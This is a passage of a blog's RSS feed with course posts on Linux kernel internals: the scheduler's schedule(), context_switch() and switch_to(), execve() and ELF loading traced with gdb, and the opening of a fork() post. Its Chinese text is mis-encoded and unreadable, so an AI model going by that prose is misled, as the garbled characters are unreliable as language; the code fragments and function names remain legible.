&lt;li>next = pick_next_task(rq, prev);//è¿ç¨è°åº¦ç®æ³é½å°è£è¿ä¸ªå½æ°åé¨&lt;/li>
&lt;li>context_switch(rq, prev, next);//è¿ç¨ä¸ä¸æåæ¢&lt;/li>
&lt;li>switch_toå©ç¨äºprevånextä¸¤ä¸ªåæ°ï¼prevæåå½åè¿ç¨ï¼nextæåè¢«è°åº¦çè¿ç¨&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;h3 id="1scheduleå½æ°">1)schedule()å½æ°&lt;/h3>
&lt;p>é¦åï¼åæ¢æ¶åï¼è°ç¨call schedule()ï¼æ¥æ§è¡scheduleï¼ï¼å½æ°ï¼å¦ä¸å¾æç¤ºï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-04-02.png" alt="">&lt;/p>
&lt;p>ä½¿ç¨struct task_struct *tsk = current; æ¥è·åå½åè¿ç¨ï¼sched_submit_work(tsk); é¿åæ­»éï¼æåè°ç¨ï¼¿schedule()æ¥å¤çåæ¢è¿ç¨&lt;/p>
&lt;h3 id="ï¼scheduleå½æ°">ï¼)ï¼¿schedule()å½æ°&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-04-15.png" alt="">&lt;/p>
&lt;p>å¶ä¸­ need_resched:ä¸ºåæ¢åçåéåå¤ï¼&lt;/p>
&lt;blockquote>
&lt;p>preempt_disable()ï¼//ç¦æ­¢åæ ¸æ¢å ï¼&lt;br>
cpu = smp_processor_id(); //è·åå½åCPU &lt;br>
rq = cpu_rq(cpu); //è·åè¯¥CPUç»´æ¤çè¿è¡éåï¼run queue)&lt;br>
rcu_note_context_switch(cpu); //æ´æ°å¨å±ç¶æï¼æ è¯å½åCPUåçä¸ä¸æçåæ¢&lt;br>
prev = rq-&amp;gt;curr; //è¿è¡éåä¸­çcurræéèµäºprevã&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-04-44.png" alt="">&lt;/p>
&lt;p>å¶ä¸­çnext=pick_next_task(rq, prev)æ¥ç¡®å®ä½¿ç¨åªä¸ç§è¿ç¨è°åº¦çç­ç¥ï¼ä½æ»æ¯éæ©äºä¸ä¸ä¸ªè¿ç¨æ¥è¿è¡åæ¢ï¼å³æ ¹æ®è°åº¦ç­ç¥éæ©ä¸ä¸ªä¼åçº§æé«çä»»å¡å°å¶å®ä¸ºä¸ä¸ä¸ªè¿ç¨ï¼æåé½æ¯è°ç¨context_switchæ¥è¿è¡è¿ç¨ä¸ä¸æçåæ¢è¿ç¨ï¼&lt;/p>
&lt;h3 id="ï¼context_switchå½æ°è§£æ">ï¼)context_switchå½æ°è§£æ&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-05-09.png" alt="">&lt;/p>
&lt;p>å¶ä¸­prepare_task_switchï¼ï¼å½æ°æ¯å®æåæ¢åçåå¤å·¥ä½ï¼æ¥çåé¢å¤æ­å½åè¿ç¨æ¯ä¸æ¯åæ ¸çº¿ç¨ï¼å¦ææ¯åæ ¸çº¿ç¨ï¼åä¸éè¦åæ¢ä¸ä¸æ&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-05-20.png" alt="">&lt;/p>
&lt;p>æ¥çè°ç¨switch_mm(),æèæåå­ä»ä¸ä¸ªè¿ç¨æ å°åæ¢å°æ°è¿ç¨ä¸­&lt;br>
è°ç¨switch_to(),ä»ä¸ä¸ä¸ªè¿ç¨çå¤çå¨ç¶æåæ¢å°æ°è¿ç¨çå¤çå¨ç¶æãè¿åæ¬ä¿å­ãæ¢å¤æ ä¿¡æ¯åå¯å­å¨ä¿¡æ¯&lt;/p>
&lt;blockquote>
&lt;p>å¦ænextæ¯åæ ¸çº¿ç¨ï¼åçº¿ç¨ä½¿ç¨prevæä½¿ç¨çå°åç©º;schedule( )å½æ°æè¯¥çº¿ç¨è®¾ç½®ä¸ºææ°TLBæ¨¡å¼&lt;/p>
&lt;/blockquote>
&lt;p>äºå®ä¸ï¼æ¯ä¸ªåæ ¸çº¿ç¨å¹¶ä¸æ¥æèªå·±çé¡µè¡¨é(task_struct-&amp;gt;mm = NULL)ï¼æ´ç¡®åå°è¯´ï¼å®ä½¿ç¨ä¸ä¸ªæ®éè¿ç¨çé¡µè¡¨éãä¸è¿ï¼æ²¡æå¿è¦ä½¿ä¸ä¸ªç¨æ·æçº¿æ§å°åå¯¹åºçTLBè¡¨é¡¹æ æï¼å ä¸ºåæ ¸çº¿ç¨ä¸è®¿é®ç¨æ·æå°åç©ºé´ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-05-50.png" alt="">&lt;/p>
&lt;p>å¦ænextæ¯ä¸ä¸ªæ®éè¿ç¨ï¼schedule( )å½æ°ç¨nextçå°åç©ºé´æ¿æ¢prevçå°åç©ºé´&lt;/p>
&lt;p>ãã|&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;|
ãã| } else |
ãã| switch_mm(oldmm, mm, next); |
ãã|&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;|&lt;/p>
&lt;p>å¦æprevæ¯åæ ¸çº¿ç¨ææ­£å¨éåºçè¿ç¨ï¼context_switch()å½æ°å°±ææåprevåå­æè¿°ç¬¦çæéä¿å­å°è¿è¡éåçprev_mmå­æ®µä¸­ï¼ç¶åéæ°è®¾ç½®prev-&amp;gt;active_mm&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-06-15.png" alt="">&lt;/p>
&lt;p>context_switch()æåè°ç¨switch_to()æ§è¡prevånextä¹é´çè¿ç¨åæ¢äº
ãããã|&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-|
ãããã| switch_to(prev, next, prev); |
ãããã|&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-|
ãããã return prev;
ãããã}&lt;/p>
&lt;h3 id="ï¼switch_toå½æ°è§£æ--">ï¼)switch_toï¼ï¼å½æ°è§£æ ã&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-06-38.png" alt="">&lt;/p>
&lt;p>switch_to(prev, next, prev)ï¼åæ¢å æ åå¯å­å¨çç¶æï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-06-51.png" alt="">&lt;/p>
&lt;p>switch_toæ¯ä¸ä¸ªå®å®ä¹ï¼å®æçå·¥ä½ä¸»è¦æ¯ï¼&lt;/p>
&lt;h4 id="1ä¿å­å½åè¿ç¨çflagsç¶æåå½åè¿ç¨çebp">(1)ä¿å­å½åè¿ç¨çflagsç¶æåå½åè¿ç¨çebp&lt;/h4>
&lt;pre>&lt;code class="language-c">ãã&amp;quot;pushfl\n\t&amp;quot; /* save flags */
ãã&amp;quot;pushl %%ebp\n\t&amp;quot; /* save EBP */
&lt;/code>&lt;/pre>
&lt;h4 id="2å®æåæ ¸å å¨espçåæ¢">(2)å®æåæ ¸å å¨espçåæ¢&lt;/h4>
&lt;pre>&lt;code class="language-c">ãã &amp;quot;movl %%esp,%[prev_sp]\n\t&amp;quot; /* save ESP */
ãã &amp;quot;movl %[next_sp],%%esp\n\t&amp;quot; /* restore ESP */
&lt;/code>&lt;/pre>
&lt;p>è¿ç¨åæ¢çæ¶åï¼è¦ä¿®æ¹å æ ï¼eipç­æ°æ®ï¼å¨switch_toä¸­å®æäºè¿ä¸ªå·¥ä½ã&lt;/p>
&lt;h4 id="3ä¿å­eipçå¼">(3)ä¿å­eipçå¼&lt;/h4>
&lt;pre>&lt;code class="language-c">ãã&amp;quot;movl $1f,%[prev_ip]\n\t&amp;quot; /* save EIP */ \
ãã&amp;quot;pushl %[next_ip]\n\t&amp;quot; /* restore EIP */ \
&lt;/code>&lt;/pre>
&lt;p>å°æ å·1:çå°åä¿å­å°prev-&amp;gt;thread.ipä¸­ï¼ç¶åä¸ä¸æ¬¡è¯¥è¿ç¨è¢«è°ç¨çæ¶åï¼å°±ä»ï¼çä½ç½®å¼å§æ§è¡ã
ã&lt;/p>
&lt;blockquote>
&lt;p>æ³¨æï¼å¦æä¹ånextä¹è¢«switch_toåºå»è¿ï¼é£ä¹next-&amp;gt;thread.ipéå­çå°±æ¯ä¸é¢è¿ä¸ª1fçæ å·ï¼ä½å¦ænextè¿ç¨ååè¢«åå»ºï¼ä¹åæ²¡æè¢«switch_toåºå»è¿ï¼é£ä¹next-&amp;gt;thread.ipéå­çå°æ¯ret_ftom_forkï¼å³è¿ç¨ååè¢«forkåæ§è¡execï¼&lt;/p>
&lt;/blockquote>
&lt;h4 id="4jmp-__switch_to">(4)jmp __switch_to&lt;/h4>
&lt;p>è®©åæ°ä¸åå¥å æ ï¼èæ¯ä½¿ç¨å¯å­å¨ä¼ å¼ï¼æ¥è°ç¨__switch_to eaxå­æ¾prev,edxå­æ¾nextã&lt;/p>
&lt;h1 id="äºgdbè·è¸ªscheduleå½æ°">äº.gdbè·è¸ªscheduleå½æ°&lt;/h1>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-07-18.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-24-Linux-kernel-analysis-task-management/2018-09-19-02-07-28.png" alt="">&lt;/p>
&lt;hr>
&lt;p>å°ç»ï¼æ´ä¸ªscheduleçæ§è¡è¿ç¨å¦ä¸å¾æç¤º&lt;br>
ã|&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-|
ãschedule&lt;br>
ããsched_submit_work(tsk)&lt;br>
ãã_schedule()&lt;br>
ããããpick_next_task&lt;br>
ããããcontext_switch(rq,prev,next)&lt;br>
ããããããprepare_task_switch&lt;br>
ããããããå¤æ­æ¯ä¸æ¯åæ ¸çº¿ç¨&lt;br>
ããããããswitch_mm&lt;br>
ããããããswitch_to&lt;br>
ãããããããã_switch_to&lt;br>
ããããããfinish_task_switch&lt;/p></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨7_execve()å½æ°å¯¹åºçç³»ç»è°ç¨å¤çè¿ç¨</title><link>http://www.guozet.me/post/Linux-kernel-analysis-execve-Function/</link><pubDate>Sat, 14 Mar 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-kernel-analysis-execve-Function/</guid><description>&lt;p>Linuxåæ ¸è¯¾ç¬¬ä¸å¨ä½ä¸ãæ¬æå¨äºè¯¾å ä¸­å®éªæ¥¼å®æã
&lt;a href="http://guozet.me/about/" target="_blank" rel="noopener">åå½æ³½&lt;/a> ååä½åè½¬è½½è¯·æ³¨æåºå¤.&lt;br>
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;p>æèåºå¨æ¢¦ä¸ºè´è¶ï¼æ ©æ ©ç¶è´è¶ä¹ï¼èªå»éå¿ä¸ï¼ä¸ç¥å¨ä¹ãä¿ç¶è§ï¼åè§è§ç¶å¨ä¹ãä¸ç¥å¨ä¹æ¢¦ä¸ºè´è¶ä¸ï¼è´è¶ä¹æ¢¦ä¸ºå¨ä¸ï¼å¨ä¸è´è¶ï¼åå¿æåç£ãæ­¤ä¹è°ç©åãï¼ãåºå­Â·é½ç©è®ºãï¼&lt;/p>
&lt;p>&lt;strong>å¨æä»¬çæä½ç³»ç»ä¸­,ä¹æå¦æ­¤æµªæ¼«ææçåºçæ¢¦è¶&amp;mdash;&amp;ndash;exec()å½æ°æ.&lt;/strong>&lt;/p>
&lt;p>åºå¨ï¼è°ç¨execveçå¯æ§è¡ç¨åºï¼å¥ç¡ï¼è°ç¨execveé·å¥åæ ¸ï¼ï¼éæ¥ï¼ç³»ç»è°ç¨execveè¿åç¨æ·æï¼åç°èªå·±æ¯è´è¶ï¼è¢«execveå è½½çå¯æ§è¡ç¨åºï¼&lt;/p>
&lt;!-- more -->
&lt;h1 id="ä¸-execå½æ°æ">ä¸. execå½æ°æ&lt;/h1>
&lt;h2 id="ä¸-ä»ç»">(ä¸) ä»ç»&lt;/h2>
&lt;p>fork()å½æ°, ç¸å½äºæ¯åå»ºäºä¸ä¸ªæ°çè¿ç¨, ä½è¯¥å­è¿ç¨å¤å¶çç¡®å®ç¶è¿ç¨çåå®¹, å¦æè®©å¶æ§è¡ä¸å»,é£ä¹ä¹æ¯æ§è¡åç¶è¿ç¨ç¸åçåå®¹å¢, &lt;strong>ä½å®éä¸­,æä»¬æ§è¡çæ¯æ°çä»»å¡, é£ä¹å¨è¿éæ¯å¦ä½å®ç°çå¢?&lt;/strong>&lt;/p>
&lt;p>execå½æ°æå°±å®ç°äºå¨ä¸ä¸ªè¿ç¨ä¸­å¯å¨å¦å¤ä¸ä¸ªç¨åºçæ¹æ³. å®å¯ä»¥æ ¹æ®æå®çæä»¶åæç®å½åæ¾å°å¯æ§è¡æä»¶ï¼å¹¶ç¨å®æ¥åä»£åè°ç¨è¿ç¨çæ°æ®æ®µãä»£ç æ®µåå æ æ®µï¼å¨æ§è¡å®ä¹åï¼åè°ç¨è¿ç¨çåå®¹é¤äºè¿ç¨å·å¤ï¼å¶ä»å¨é¨è¢«æ°çè¿ç¨æ¿æ¢äºãå¦å¤ï¼è¿éçå¯æ§è¡æä»¶æ¢å¯ä»¥æ¯äºè¿å¶æä»¶ï¼ä¹å¯ä»¥æ¯Linuxä¸ä»»ä½å¯æ§è¡çèæ¬æä»¶ã&lt;/p>
&lt;p>é£ä»ä¹æ¶åä½¿ç¨execå½æ°å¢? é¤äºæä»¬ä¸é¢æå°çfork()ä¹åè°ç¨exec()å½æ°æ¥æ§è¡ä¸ä¸ªæ°è¿ç¨å¤,è¿æå½è¿ç¨è®¤ä¸ºèªå·±ç»§ç»­æ§è¡ä¸å»ä¹æ²¡æä»ä¹å®éçå·¥ä½çæ¶å,å°±å¯ä»¥è°ç¨execå½æ°æ¥åºå¨æ¢¦è¶,åæè¶äº.&lt;/p>
&lt;h2 id="äº-å½æ°æå·ä½å®ç°">(äº) å½æ°æå·ä½å®ç°&lt;/h2>
&lt;p>å¨linuxä¸,æå­ä¸ªexecå¼å¤´çå½æ°, æ¥å®ç°:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-01-53-00.png" alt="">&lt;/p>
&lt;p>è¿6ä¸ªå½æ°å¨å½æ°ååä½¿ç¨è¯­æ³çè§åä¸é½æç»å¾®çåºå«ï¼ä¸é¢å°±ä»å¯æ§è¡æä»¶æ¥æ¾æ¹å¼ãåæ°ä¼ éæ¹å¼åç¯å¢åéè¿å ä¸ªæ¹é¢è¿è¡æ¯è¾ã&lt;/p>
&lt;ul>
&lt;li>
&lt;p>æ¥æ¾æ¹å¼ï¼è¡¨1ä¸­çå4ä¸ªå½æ°çæ¥æ¾æ¹å¼é½æ¯å®æ´çæä»¶ç®å½è·¯å¾ï¼èæåä¸¤ä¸ªå½æ°ï¼ä¹å°±æ¯ä»¥ p ç»å°¾çä¸¤ä¸ªå½æ°ï¼å¯ä»¥åªç»åºæä»¶åï¼ç³»ç»å°±ä¼èªå¨æç§ç¯å¢åéâ$PATHâ ææå®çè·¯å¾è¿è¡æ¥æ¾ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åæ°ä¼ éæ¹å¼ï¼execå½æ°æçåæ°ä¼ éæä¸¤ç§ï¼ä¸ç§æ¯éä¸ªåä¸¾çæ¹å¼ï¼èå¦ä¸ç§åæ¯å°ææåæ°æ´ä½æé æéæ°ç»ä¼ éãå¨è¿éæ¯ä»¥å½æ°åçç¬¬5ä½å­æ¯æ¥åºåçï¼å­æ¯ä¸º &amp;ldquo;l&amp;rdquo;(list)çè¡¨ç¤ºéä¸ªåä¸¾åæ°çæ¹å¼ï¼å¶è¯­æ³ä¸ºï¼&lt;br>
`const char *arg;å­æ¯ä¸ºâvâ(vector)çè¡¨ç¤ºå°ææåæ°æ´ä½æé æéæ°ç»ä¼ éï¼å¶è¯­æ³ä¸º char *const argv[]&amp;lsquo;``ã&lt;br>
è¿éçåæ°å®éä¸å°±æ¯ç¨æ·å¨ä½¿ç¨è¿ä¸ªå¯æ§è¡æä»¶æ¶æéçå¨é¨å½ä»¤éé¡¹å­ç¬¦ä¸²ï¼åæ¬è¯¥å¯æ§è¡ç¨åºå½ä»¤æ¬èº«ï¼ãè¦æ³¨æçæ¯ï¼è¿äºåæ°å¿é¡»ä»¥NULLç»æã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¯å¢åéï¼ execå½æ°æå¯ä»¥é»è®¤ç³»ç»çç¯å¢åéï¼ä¹å¯ä»¥ä¼ å¥æå®çç¯å¢åéãè¿éä»¥ âeâ(environment)ç»å°¾çä¸¤ä¸ªå½æ° execle()å execve()å°±å¯ä»¥å¨ envp[]ä¸­æå®å½åè¿ç¨æä½¿ç¨çç¯å¢åéã&lt;br>
è¡¨2åå¯¹è¿6ä¸ªå½æ°ä¸­çå½æ°ååå¯¹åºè¯­æ³åäºä¸ä¸ªå°ç»ï¼ä¸»è¦æåºäºå½æ°åä¸­æ¯ä¸ä½å¯¹åºæè¡¨æçå«ä¹ï¼ä»¥æ­¤è¡¨å ä»¥è®°ä½è¿6ä¸ªå½æ°ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-01-53-37.png" alt="">&lt;/p>
&lt;p>ãã äºå®ä¸ï¼è¿6ä¸ªå½æ°ä¸­çæ­£çç³»ç»è°ç¨åªæexecve()ï¼å¶ä»5ä¸ªé½æ¯åºå½æ°ï¼å®ä»¬æç»é½ä¼è°ç¨execve()è¿ä¸ªç³»ç»è°ç¨ãå¨ä½¿ç¨execå½æ°ææ¶ï¼ä¸å®è¦å ä¸éè¯¯å¤æ­è¯­å¥ãexec å¾å®¹ææ§è¡å¤±è´¥ï¼å¶ä¸­æå¸¸è§çåå æï¼&lt;/p>
&lt;ol>
&lt;li>æ¾ä¸å°æä»¶æè·¯å¾ï¼æ­¤æ¶ errno è¢«è®¾ç½®ä¸º ENOENTã&lt;/li>
&lt;li>æ°ç»argv åenvp å¿è®°ç¨NULLç»æï¼æ­¤æ¶ï¼errnoè¢«è®¾ç½®ä¸º EFAULã&lt;/li>
&lt;li>æ²¡æå¯¹åºå¯æ§è¡æä»¶çè¿è¡æéï¼æ­¤æ¶ errno è¢«è®¾ç½®ä¸ºEACCESã&lt;/li>
&lt;/ol>
&lt;h1 id="äºå®éªåæ">äº.å®éªåæ&lt;/h1>
&lt;p>å®è·µæ¥æ£éªçè®º, æè½è®©èªå·±çç¥è¯å­¦ä¹ çæ´å ç¢åºã&lt;/p>
&lt;p>è¿å¥gdbè°è¯,è®¾ç½®æ­ç¹:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-01-57-41.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-01-58-06.png" alt="">&lt;/p>
&lt;p>ããä¸»è¦è®¾ç½®äºä»¥ä¸å ä¸ªæ­ç¹ã&lt;/p>
&lt;pre>&lt;code class="language-bash">b sys_execve
b do_execve
b do_open_exev
b do search_binary_handler
b load_elf_binary
b start_thread
b init_elf_binfmt
&lt;/code>&lt;/pre>
&lt;p>ä¸é¢å°±ä¸»è¦åæè¿å ä¸ªæ­ç¹å¤çå½æ°åè½å®ç°äº.&lt;/p>
&lt;h3 id="1é¦ååæå½æ°å®ç°">1.é¦ååæå½æ°å®ç°&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-01-58-55.png" alt="">&lt;/p>
&lt;p>å¨å½æ°ä¸­,æä»¬å¯ææ¾ççå°,å¨forkæ§è¡å®æä¹å,æä»¬éè¿execlp()å è½½äºå¯æ§è¡ç¨åºhello.&lt;/p>
&lt;p>&lt;strong>å¨è¿éè°ç¨çæ¯execlp(), æç»è°ç¨çä¹æ¯execve()è¿ä¸ªç³»ç»è°ç¨ã&lt;/strong>&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-01-59-12.png" alt="">
ãã
æ¸æ°ççå°, ç³»ç»è°ç¨ä¹åæ§è¡äºdo_execve()&lt;/p>
&lt;h3 id="2do_execveå½æ°åæ">2.do_execve()å½æ°åæ&lt;/h3>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-01-59-32.png" alt="">&lt;/p>
&lt;h4 id="1å¨do_execveä¸­éè®¾ç½®äºç¸åºçåæ°åç¯å¢åéç¶åè°ç¨äºdo_execve_commonå½æ°">1)å¨do_execveä¸­éè®¾ç½®äºç¸åºçåæ°åç¯å¢åé,ç¶åè°ç¨äºdo_execve_common()å½æ°&lt;/h4>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-01-59-46.png" alt="">&lt;/p>
&lt;h4 id="2do_execve_commonå½æ°ä»ç»">2)do_execve_common()å½æ°ä»ç»&lt;/h4>
&lt;p>å¨do_execve_common()å½æ°ä¸­,åæå¼å¯¹åºæä»¶,å¨è¿éæ¯hello&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-01-59-57.png" alt="">&lt;/p>
&lt;p>æ¥çå°æä»¶å,ç¯å¢åé,å½ä»¤è¡åæ°æ·è´å°æ°åéçé¡µé¢ä¸­:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-00-19.png" alt="">&lt;/p>
&lt;p>æåæ§è¡ exec_binprmæ¥æ§è¡è¯¥å¯æ§è¡æä»¶æ ¼å¼çå¤çå½æ°:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-00-33.png" alt="">&lt;/p>
&lt;p>æ¥çè¯¦ç»åæexec_binprmä¸­å½æ°çæ§è¡è¿ç¨, åæå¦ä½æ¥å è½½elfæä»¶æ ¼å¼ç.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-00-43.png" alt="">
ãã
å¨è¯¥å½æ°ä¸­, å¯ä»¥çå°è°ç¨äºsearch_binary_handler(bprm)å½æ°,è¯¥å½æ°å¯»æ¾ç¬¦åæä»¶æ ¼å¼å¯¹åºçè§£ææ¨¡å.&lt;br>
&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-00-52.png" alt="">
ãã
å¶ä¸­çlinux_binfmt *fmtç»æä½ä¸º:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-01-04.png" alt="">
ãã
æä»¬è¿éè°ç¨çæ¯helloå¯æ§è¡æä»¶,ä¸ºelfæ ¼å¼,æææåæ¥æ¾åè°ç¨ä¸º:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-01-14.png" alt="">&lt;/p>
&lt;p>å¯¹åºelfæ ¼å¼æ¥æ¾å¯å¾:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-01-30.png" alt="">
ãã
å¯¹äºELFæ ¼å¼çå¯æ§è¡æä»¶fmt-&amp;gt;load_binary(bprm);æ§è¡çåºè¯¥æ¯load_elf_binaryå¶åé¨æ¯åELFæä»¶æ ¼å¼è§£æçé¨åéè¦åELFæä»¶æ ¼å¼æ åç»åèµ·æ¥éè¯»&lt;/p>
&lt;p>å¯¹åºelfæä»¶çæ ¼å¼ä¸º:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-01-49.png" alt="">&lt;/p>
&lt;p>æ´ä¸ªELFæ åå°±æ¯ç±æä»¶å¤´ãåºæ®µå¤´è¡¨ãç¨åºå¤´è¡¨ãä¸å®æ°éçåºæ®µãä»¥åä¸å®æ°éçé¨ææï¼èELFæ åçè£å¥/å¯å¨è¿ç¨ï¼åå°±æ¯å¨åç§å¤´é¨ä¿¡æ¯çæå¼ä¸å°æäºé¨æåºæ®µè£å¥ä¸ä¸ªè¿ç¨çç¨æ·ç©ºé´ï¼å¹¶ä¸ºå¶è¿è¡åå¥½åå¤(ä¾å¦è£å¥æéçå±äº«åº)ï¼æå(å¨ç®æ è¿ç¨é¦æ¬¡åè°åº¦è¿è¡æ¶)è®©CPUè¿å¥å¶ç¨åºå¥å£çè¿ç¨ãæ¥çæ¯å¯¹elf_bss ãelf_brkãstart_codeãend_codeç­ç­åéçåå§åãè¿äºåéåå«çºªå½çå½å(å°æ­¤å»ä¸ºæ­¢)ç®æ æ åçbssæ®µãä»£ç æ®µãæ°æ®æ®µãä»¥åå¨æåéâå â å¨ç¨æ·ç©ºé´çä½ç½®ãé¤start_codeçåå§å¼ä¸º0xffffffffå¤ï¼å¶ä½åä¸º0ãéçæ ååå®¹çè£å¥ï¼è¿äºåéä¹ä¼éæ­¥å¾å°è°æ´ã&lt;/p>
&lt;p>load_elf_binaryå½æ°çä½ç¨å°±æ¯è¯»å¥äºç¨åºå¤´è¡¨ï¼å¹¶å¯¹start_codeç­åéè¿è¡åå§å.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-02-10.png" alt="">&lt;/p>
&lt;p>å¨load_elf_binaryçæåè°ç¨&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-21-Linux-kernel-analysis-execve-Function/2018-09-19-02-02-28.png" alt="">&lt;/p>
&lt;p>å¨è¿éå°±ææ°ç¨åºçipåspå­å¥å æ ,è¦çæäºä¹åçip,sp,ä¹å,å­è¿ç¨è¿åçè¯,å°±ä»helloä¸­çmainå¼å§æ§è¡äº.&lt;/p>
&lt;h2 id="3å½æ°æ§è¡æµç¨ç¤ºæå¾">3.å½æ°æ§è¡æµç¨ç¤ºæå¾:&lt;/h2>
&lt;pre>&lt;code>execlp-&amp;gt;hello
call *sys_execve
........do_execve
................. do_execve_common
......................... exec_binprm
...................................search_binary_handler(bprm)
.........................................linux_binfmt= elf_format
..............................................elf_format-&amp;gt; load_elf_binary
..............................................load_elf_binary
.....................................................start_thread
ret
&lt;/code>&lt;/pre></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨6_è¿ç¨åå»º</title><link>http://www.guozet.me/post/Linux-kernel-analysis-building-task/</link><pubDate>Sat, 07 Mar 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-kernel-analysis-building-task/</guid><description>&lt;p>Linuxåæ ¸è¯¾ç¬¬å­å¨ä½ä¸ãæ¬æå¨äºè¯¾å ä¸­å®éªæ¥¼å®æã&lt;br>
&lt;a href="http://guozet.me/about/" target="_blank" rel="noopener">åå½æ³½&lt;/a> ååä½åè½¬è½½è¯·æ³¨æåºå¤.&lt;br>
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;h1 id="forkç³»ç»è°ç¨">fork()ç³»ç»è°ç¨&lt;/h1>
&lt;h2 id="é¢å¤ç¥è¯">é¢å¤ç¥è¯&lt;/h2>
&lt;p>è¿éåååºä¸äºå¿è¦çé¢å¤ç¥è¯ï¼å¯¹linuxä¸è¿ç¨æºå¶æ¯è¾çæçæåå¯ä»¥ç¥è¿ã&lt;/p>
&lt;ol>
